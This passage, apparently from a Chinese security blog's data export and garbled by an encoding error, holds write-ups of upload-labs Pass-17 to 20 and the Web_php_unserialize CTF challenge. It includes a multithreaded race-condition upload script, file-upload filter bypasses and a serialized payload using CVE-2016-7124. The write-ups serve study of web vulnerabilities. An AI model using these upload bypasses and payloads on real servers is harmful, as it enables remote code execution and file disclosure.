åˆ¤æ–­äº†åç¼€åã€content-typeï¼Œä»¥åŠåˆ©ç”¨imagecreatefromgifåˆ¤æ–­æ˜¯å¦ä¸ºgifå›¾ç‰‡ï¼Œæœ€åå†åšäº†ä¸€æ¬¡äºŒæ¬¡æ¸²æŸ“ 2. åˆ©ç”¨ Pass-17 æ¡ä»¶ç«äº‰1. åˆ†æ1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125;&#125; å¯ä»¥çœ‹åˆ°æ–‡ä»¶å…ˆç»è¿‡ä¿å­˜ï¼Œç„¶ååˆ¤æ–­åç¼€åæ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œå¦‚æœä¸åœ¨åˆ™åˆ é™¤ï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰åœ¨ä¿å­˜æ–‡ä»¶ååˆ é™¤æ–‡ä»¶å‰æ¥æ‰§è¡Œphpæ–‡ä»¶ 2.åˆ©ç”¨åˆ©ç”¨æ¡ä»¶ç«äº‰åˆ é™¤æ–‡ä»¶æ—¶é—´å·®ç»•è¿‡ã€‚ä½¿ç”¨å‘½ä»¤pip install hackhttpå®‰è£…hackhttpæ¨¡å—ï¼Œè¿è¡Œä¸‹é¢çš„Pythonä»£ç å³å¯ã€‚å¦‚æœè¿˜æ˜¯åˆ é™¤å¤ªå¿«ï¼Œå¯ä»¥é€‚å½“è°ƒæ•´çº¿ç¨‹å¹¶å‘æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python# coding:utf-8import hackhttpfrom multiprocessing.dummy import Pool as ThreadPooldef upload(lists): hh = hackhttp.hackhttp() raw = &quot;&quot;&quot;POST /Pass-17/index.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/Pass-17/index.phpCookie: pass=17Connection: closeUpgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=---------------------------6696274297634Content-Length: 341-----------------------------6696274297634Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;17.php&quot;Content-Type: application/octet-stream&lt;?php phpinfo();?&gt;-----------------------------6696274297634Content-Disposition: form-data; name=&quot;submit&quot;ä¸Šä¼ -----------------------------6696274297634--&quot;&quot;&quot; code, head, html, redirect, log = hh.http(&#x27;http://127.0.0.1/Pass-17/index.php&#x27;, raw=raw) print(str(code) + &quot;\\r&quot;)pool = ThreadPool(200)pool.map(upload, range(100000))pool.close()pool.join() Pass-18 æ¡ä»¶ç«äº‰123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118//index.php$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; require_once(&quot;./myupload.php&quot;); $imgFileName =time(); $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = &#x27;æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚&#x27;; break; case -1: $msg = &#x27;è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚&#x27;; break; case -2: $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚&#x27;; break; case -3: $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚&#x27;; break; case -4: $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚&#x27;; break; case -5: $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚&#x27;; break; case -6: $msg = &#x27;æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚&#x27;; break; default: $msg = &#x27;æœªçŸ¥é”™è¯¯ï¼&#x27;; break; &#125;&#125;//myupload.phpclass MyUpload&#123;.................. var $cls_arr_ext_accepted = array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );.................. /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( &quot;SUCCESS&quot; ); &#125;.................. &#125;; moveæ–‡ä»¶åœ¨renameå‰é¢ï¼Œåˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œä¸Šä¼ å›¾ç‰‡é©¬ 2. åˆ©ç”¨ æ— é™é‡æ”¾ï¼Œæˆ‘è¿™æ²¡è·‘å‡ºæ¥ğŸ˜‚ Pass-19 /. or 0x00ç»•è¿‡1. åˆ†æ12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#x27;save_name&#x27;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125;else&#123; $msg = &#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; é€šè¿‡ä»£ç ï¼Œå‘ç°move_uploaded_file()å‡½æ•°ä¸­çš„img_pathæ˜¯ç”±postå‚æ•°save_nameæ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥åœ¨save_nameåˆ©ç”¨00æˆªæ–­ç»•è¿‡ã€‚ å½“ç„¶ï¼Œå› ä¸ºmove_uploaded_fileä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„/., æ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨/.ç»•è¿‡ 2. åˆ©ç”¨/.ç»•è¿‡ Pass-20 æ•°ç»„+/.ç»•è¿‡1. ä»£ç åˆ†æ123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //æ£€æŸ¥MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;; &#125;else&#123; //æ£€æŸ¥æ–‡ä»¶å $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;;&#125; ç¬¬5è¡Œå…ˆæ£€æŸ¥MIMEç±»å‹ï¼Œç„¶ååˆ¤æ–­save_nameå‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºå°±æŠŠæ–‡ä»¶æœ¬æ¥åç§°èµ‹å€¼ç»™$file,å¦åˆ™å°±æ˜¯å°†save_nameå‚æ•°çš„å€¼èµ‹ç»™å®ƒã€‚ç´§æ¥ç€åˆ¤æ–­$fileæ˜¯å¦æ˜¯æ•°ç»„ï¼Œå¦‚æœä¸æ˜¯æ•°ç»„åˆ™å°†å…¶æ‹†æˆæ•°ç»„ï¼Œè¿™é‡Œexplode æ ¹æ®.åˆ†å‰²ï¼Œè¿”å›å€¼ä¸ºæ•°ç»„ explode() å‡½æ•°æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ è¯­æ³•ï¼šexplode(separator,string,limit) å‚æ•° æè¿° separator å¿…éœ€ã€‚è§„å®šåœ¨å“ªé‡Œåˆ†å‰²å­—ç¬¦ä¸²ã€‚ string å¿…éœ€ã€‚è¦åˆ†å‰²çš„å­—ç¬¦ä¸²ã€‚ limit å¯é€‰ã€‚è§„å®šæ‰€è¿”å›çš„æ•°ç»„å…ƒç´ çš„æ•°ç›®ã€‚å¯èƒ½çš„å€¼ï¼šå¤§äº 0 - è¿”å›åŒ…å«æœ€å¤š limit ä¸ªå…ƒç´ çš„æ•°ç»„å°äº 0 - è¿”å›åŒ…å«é™¤äº†æœ€åçš„ -limit ä¸ªå…ƒç´ ä»¥å¤–çš„æ‰€æœ‰å…ƒç´ çš„æ•°ç»„0 - è¿”å›åŒ…å«ä¸€ä¸ªå…ƒç´ çš„æ•°ç»„ è¿”å›å€¼ï¼š è¿”å›å­—ç¬¦ä¸²çš„æ•°ç»„ æ•°ç»„æœ€åä¸€ä¸ªçš„å€¼(endå‡½æ•°å°±æ˜¯å–æ•°ç»„æœ€åä¸€ä¸ªçš„å€¼)åŒç™½åå•åšæ¯”è¾ƒï¼Œç¬¦åˆjpgã€pngã€gifä¸­çš„ä¸€ç§å°±å…è®¸ä¸Šä¼ äº† â€‹ åœ¨å…è®¸ä¸Šä¼ ä¹‹åè¿˜è¦æŠŠæ•°ç»„çš„å€¼æ‹¼æ¥åœ¨ä¸€èµ·å¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ : save_name[0]=tao.php/ save_name[1]ç½®ä¸ºç©º save_name[2]=jpg(ç™½åå•åç¼€æ ¡éªŒ) reset() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º reset($file)å–çš„æ˜¯æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ å³tao.php/ï¼Œç„¶åæ¥äº†ä¸€ä¸ªâ€™.â€™ç¬¦å·ï¼Œä¹‹ååˆå°†æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ å†…å®¹æ‹¼æ¥åˆ°ä¸€èµ· Qï¼šå¯èƒ½æœ‰çš„äººä¼šç–‘é—®æ•°ç»„æœ€åä¸€ä¸ªå€¼ä¸æ˜¯jpgå—ï¼Ÿ Aï¼šå…¶å®å½“æˆ‘ä»¬åªè®¾ç½®äº†ä¸¤ä¸ªæ•°ç»„å…ƒç´ çš„æ—¶å€™ï¼Œæ•°ç»„çš„å…ƒç´ ä¸ªæ•°å°±åªæœ‰ä¸¤ä¸ªäº†ã€‚åŸå› å¦‚ä¸‹å›¾ï¼š ä¹‹åç¬¬20å¯¹$file_nameè¿›è¡Œçš„æ‹¼æ¥ï¼Œå› ä¸º$save_name[2-1] = $save_name[1] =ç©º, æ‰€ä»¥æœ€å$file_nameçš„å€¼ä¸ºtao.php/. é‚£ä¹ˆæœ€ååˆ©ç”¨åŸç†å°±è·ŸPass19ä¸€æ ·äº†ï¼Œå¯¹äºåƒtao.php/.è¿™æ ·çš„æ–‡ä»¶è·¯å¾„ï¼Œmove_uploaded_file()å‡½æ•°ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„/.ã€‚å¦‚æ­¤ä¸€æ¥ä¸Šä¼ çš„å°±æ˜¯phpæ–‡ä»¶åç¼€äº† 2. åˆ©ç”¨burpæŠ“åŒ…ä¸Šä¼ ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://bobtaoy.github.io/categories/PHP/"},{"name":"webå®‰å…¨","slug":"PHP/webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"phpå®‰å…¨","slug":"phpå®‰å…¨","permalink":"https://bobtaoy.github.io/tags/php%E5%AE%89%E5%85%A8/"}]},{"title":"æ”»é˜²ä¸–ç•Œ-Web_php_unserialize Writeup","slug":"æ”»é˜²ä¸–ç•Œ-Web-php-unserialize-Writeup","date":"2020-10-22T02:51:00.000Z","updated":"2020-10-22T03:05:40.035Z","comments":true,"path":"2020/10/22/æ”»é˜²ä¸–ç•Œ-Web-php-unserialize-Writeup/","link":"","permalink":"https://bobtaoy.github.io/2020/10/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-unserialize-Writeup/","excerpt":"","text":"é¢˜ç›®123456789101112131415161718192021222324252627&lt;?php class Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the fl4g.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125; &#125;if (isset($_GET[&#x27;var&#x27;])) &#123; $var = base64_decode($_GET[&#x27;var&#x27;]); if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123; die(&#x27;stop hacking!&#x27;); &#125; else &#123; @unserialize($var); &#125; &#125; else &#123; highlight_file(&quot;index.php&quot;); &#125; ?&gt; è§£é¢˜ä»£ç åˆ†æä»£ç æ˜¯ä»17è¡Œå¼€å§‹æ‰§è¡Œçš„ï¼š é¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨GETå‚æ•°var, è‹¥å­˜åœ¨åˆ™å¯¹å…¶è¿›è¡ŒBase64è§£ç åå­˜å…¥$varå˜é‡ï¼Œè‹¥ä¸å­˜åœ¨ï¼Œæ‰§è¡Œ25è¡Œçš„ä»£ç ï¼Œé«˜äº®è¾“å‡ºå½“å‰é¡µé¢çš„æºç  è§£ç åå¯¹$varè¿›è¡Œä¸€ä¸ªæ­£åˆ™çš„åŒ¹é…ï¼ŒåŒ¹é…åˆ°çš„è¯ç›´æ¥ç»“æŸï¼ˆdieï¼‰å¹¶æ˜¾ç¤º stop hacking!**ï¼Œå¦‚æœæ²¡åŒ¹é…åˆ°å°±ååºåˆ—åŒ–** æºä»£ç ä¸­ç»™å‡ºäº†Demoç±»ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“è¿™ä¸‰ä¸ªé­”æœ¯æ–¹æ³•ï¼š __construct()ï¼šphpæ„é€ æ–¹æ³•ï¼Œå…·æœ‰æ„é€ æ–¹æ³•çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡å‰è°ƒç”¨æ­¤æ–¹æ³• ï¼Œè¯¥æ–¹æ³•å¸¸ç”¨äºå®Œæˆä¸€äº›åˆå§‹åŒ–å·¥ä½œï¼Œ __destruct()ï¼šphpææ„æ–¹æ³•ï¼Œå½“ æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤ æˆ–è€… å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯ æ—¶ï¼Œä¼šæ‰§è¡Œæ­¤æ–¹æ³•ã€‚ __wakeup()ï¼šPHPååºåˆ—åŒ–æ—¶æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªæ–¹æ³•ï¼Œ unserialize()ä¼šå…ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨ __wakeup() æ–¹æ³• ï¼Œ è‹¥å­˜åœ¨åˆ™ä¼šå…ˆè°ƒç”¨è¯¥æ–¹æ³• ï¼Œ æ¥é¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æº( æ¯”å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ ï¼Œ æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ“ä½œç­‰ç­‰ ) æ›´å¤šæœ‰å…³PHPé­”æ³•æ–¹æ³•çš„å†…å®¹å¯ä»¥å‚è€ƒï¼šhttps://www.php.net/manual/zh/language.oop5.magic.php æ¥ä¸‹æ¥åˆ†æDemoç±»ï¼Œ æ‰§è¡Œ__construct()æ–¹æ³•ï¼Œå°†ä¼ å…¥çš„ $file èµ‹å€¼ç»™æœ¬åœ°çš„ç§æœ‰æ–¹æ³• $file é”€æ¯æ—¶æ‰§è¡Œ __destruct() æ–¹æ³•ï¼Œé«˜äº®æœ¬åœ°å˜é‡ $fileæ‰€æŒ‡å‘ æ–‡ä»¶çš„ä»£ç  è¿™é‡Œéœ€è¦æ³¨æ„ç¬¬12è¡Œçš„æ³¨é‡Šï¼š 1//the secret is in the fl4g.php æ˜ç¤ºäº†æˆ‘ä»¬flagåœ¨fl4g.phpæ–‡ä»¶ä¸­ åºåˆ—åŒ–å’Œååºåˆ—åŒ– æ›´è¯¦ç»†çš„è¯´æ˜ï¼Œå‚è€ƒï¼šæ·±åº¦å‰–æPHPåºåˆ—åŒ–å’Œååºåˆ—åŒ– è§£é¢˜æ€è·¯æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸¤ä¸ªç‚¹ï¼Œä¸Šé¢çš„ä»£ç æ˜¯ä»17è¡Œå¼€å§‹æ‰§è¡Œçš„ï¼Œè€Œä¸”unserialize()æ–¹æ³•çš„å‚æ•°æ¥æºä¸GETè¯·æ±‚ï¼Œè¯·æ±‚å€¼ç»è¿‡äº†base64 å’Œ æ­£åˆ™åŒ¹é…ï¼Œ ä¸»è¦çš„æ˜¯å‚æ•°æ˜¯å¯æ§çš„ï¼ˆå¯¹ä¸æˆ‘ä»¬æ¥è¯´ï¼‰ è¿˜æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„ç‚¹å°±æ˜¯__wakeup()æ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬çš„flagåœ¨fl4g.phpæ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡__wakeup()å‡½æ•°ï¼Œè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨CVE-2016-7124çš„æ¼æ´ï¼šå³å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ 1preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var) è¿˜æœ‰ä¸€ç‚¹è¯´æ˜ï¼Œå°±æ˜¯è¿™é‡Œæ­£åˆ™åŒ¹é…çš„è§„åˆ™æ˜¯: åœ¨ä¸åŒºåˆ†å¤§å°å†™çš„æƒ…å†µä¸‹ ï¼Œ è‹¥å­—ç¬¦ä¸²å‡ºç° â€œo:æ•°å­—â€ æˆ–è€… â€œc:æ•°å­—â€™ è¿™æ ·çš„æ ¼å¼ ï¼Œ é‚£ä¹ˆå°±è¢«è¿‡æ»¤ . è€Œserialize() çš„å‚æ•°ä¸º object ï¼Œå› æ­¤å‚æ•°ç±»å‹è‚¯å®šä¸ºå¯¹è±¡ â€œ O â€œ ï¼Œ åˆå› ä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼ä¸º å‚æ•°æ ¼å¼:å‚æ•°åé•¿åº¦ ï¼Œ å› æ­¤ &quot; O:4 &quot; è¿™æ ·çš„å­—ç¬¦ä¸²è‚¯å®šæ— æ³•é€šè¿‡æ­£åˆ™åŒ¹é… ç»•è¿‡æ­£åˆ™çš„åŒ¹é…ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨4åŠ ä¸Š+æ¥ç»•è¿‡ï¼Œå› ä¸ºåœ¨ php è¯­æ³•ä¸­ï¼Œ+4 = 4 1234567&lt;?php echo 4; echo &#x27;&lt;br&gt;&#x27;; echo +4; echo &#x27;&lt;br&gt;&#x27;; echo -4;?&gt; æ›´æ·±å…¥çš„äº†è§£å¯ä»¥å‚è€ƒï¼šphpååºåˆ—unserializeçš„ä¸€ä¸ªå°ç‰¹æ€§ ç»•è¿‡__wakeup()ï¼Œè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨CVE-2016-7124çš„æ¼æ´ï¼šå³å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ æ„é€ pyload 12345678910111213141516171819202122232425262728&lt;?phpclass Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the fl4g.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125; &#125;$t = new Demo(&#x27;fl4g.php&#x27;);$b = serialize($t);echo $b.&#x27;&lt;br /&gt;&#x27;; // O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;$b = str_replace(&#x27;O:4&#x27;, &#x27;O:+4&#x27;, $b); //ç»•è¿‡preg_match$b = str_replace(&#x27;:1:&#x27;, &#x27;:2:&#x27;, $b); //ç»•è¿‡__wakeupecho $b.&#x27;&lt;br /&gt;&#x27;; // O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;echo base64_encode($b);?&gt; ä¸Šé¢çš„ä»£ç ä¸ºä»€ä¹ˆç”¨str_replace()æ›¿æ¢ï¼Œè€Œä¸æ˜¯ç›´æ¥å¤åˆ¶ç²˜è´´ï¼Œç„¶åç¼–ç å‘¢? è¿™å°±æ¶‰åŠåˆ°ç§æœ‰å±æ€§åºåˆ—åŒ–ä»¥åï¼Œä¼šäº§ç”Ÿ%00çš„é—®é¢˜ï¼Œåé¢è¯¦ç»†åˆ†æï¼Œ æˆ‘ä»¬é€šè¿‡æ€è·¯ï¼Œæ„é€ payloadå¦‚ä¸‹ï¼š ?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== è§£é‡Šä¸€ä¸‹ä¸Šé¢çš„é—®é¢˜ Demoç±»åºåˆ—åŒ–çš„ç»“æœå¦‚ä¸‹ï¼š 1O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125; æ³¨æ„s:10:&quot;Demofile&quot;, æ˜æ˜Demofileæ˜¯8ä¸ªå­—ç¬¦ï¼Œ ä¸ºä»€ä¹ˆè¿™é‡Œæ˜¾ç¤ºs:10å‘¢? ä¸ºäº†æ›´æ¸…æ™°çš„æ˜¾ç¤ºä¸ºä»€ä¹ˆï¼Œæˆ‘ä»¬ç”¨urlencode()æ‰“å°ä¸Šé¢çš„å€¼ è¿™é‡Œs:10, å°±æ˜¯å› ä¸ºè¿™é‡Œä¸¤ä¸ª%00å¯¼è‡´çš„ã€‚ è¿™é‡Œä¸ºä»€ä¹ˆè¦è¯´è¿™ä¸ªï¼Ÿ%00æœ‰ä»€ä¹ˆå½±å“å˜›? è¿™é‡Œçš„å‘å°±åœ¨ï¼šå¦‚æœæˆ‘ä»¬ç›´æ¥å¤åˆ¶æ–‡æœ¬è¿›è¡Œbase64ç¼–ç ï¼Œä¼šä¸¢å¤±%00, å† è§£ç -&gt;ååºåˆ—åŒ– è‡ªç„¶ä¸æˆ‘ä¹‹å‰åºåˆ—åŒ–çš„ Demo ä¸ç›¸åŒ å¯¹äºè¿™é‡Œï¼Œè§£å†³æ–¹æ³•å°±æ˜¯ï¼Œä½¿ç”¨str_replaceæ›¿æ¢ï¼Œ æˆ‘ä»¬é€šè¿‡å¯¹æ¯”ï¼Œæ¥è§‚å¯Ÿä¸€ä¸‹ä»–ä»¬æœ‰ä»€ä¹ˆä¸åŒï¼š 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the fl4g.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125; &#125;$t = new Demo(&#x27;fl4g.php&#x27;);$b = serialize($t);echo $b.&#x27;&lt;br /&gt;&#x27;; // O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;$b = str_replace(&#x27;O:4&#x27;, &#x27;O:+4&#x27;, $b); //ç»•è¿‡preg_match$b = str_replace(&#x27;:1:&#x27;, &#x27;:2:&#x27;, $b); //ç»•è¿‡__wakeupecho base64_encode(&#x27;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#x27;);echo 